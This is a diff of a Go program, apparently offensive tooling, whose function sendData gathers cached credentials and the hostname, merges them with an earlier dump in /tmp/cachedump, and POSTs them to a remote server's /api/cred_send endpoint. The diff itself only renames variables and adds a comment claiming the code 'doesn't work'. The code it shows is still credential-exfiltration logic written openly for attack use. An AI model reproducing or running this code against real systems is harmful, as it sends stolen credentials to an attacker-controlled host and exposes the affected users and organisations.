@@ -1,4 +1,5 @@
 // ship the credential cache to the server
+// disclaimer: this doesn't work
 // @author: degenerat3
 
 package main
@@ -23,18 +24,18 @@ func sendData(c cred_cache.CredCache) {
 	path := "/tmp/cachedump"
 	h := c.Get_hostname()
 	creds := c.Get_entries()
-	previous_dump := fetchDump(path)
-	if previous_dump != nil {
-		for _, c := range previous_dump {
+	previousDump := fetchDump(path)
+	if previousDump != nil {
+		for _, c := range previousDump {
 			creds = append(creds, c)
 		}
 	}
-	cred_str := ""
+	credStr := ""
 	for _, cd := range creds {
-		cred_str += cd + "\n"
+		credStr += cd + "\n"
 	}
 	url := "http://" + serv + "/api/cred_send" //turn ip into URL
-	jsonData := map[string]string{"hostname": h, "credentials": cred_str}
+	jsonData := map[string]string{"hostname": h, "credentials": credStr}
 	jsonValue, _ := json.Marshal(jsonData)
 	_, err := http.Post(url, "application/json", bytes.NewBuffer(jsonValue))
 	if err != nil {
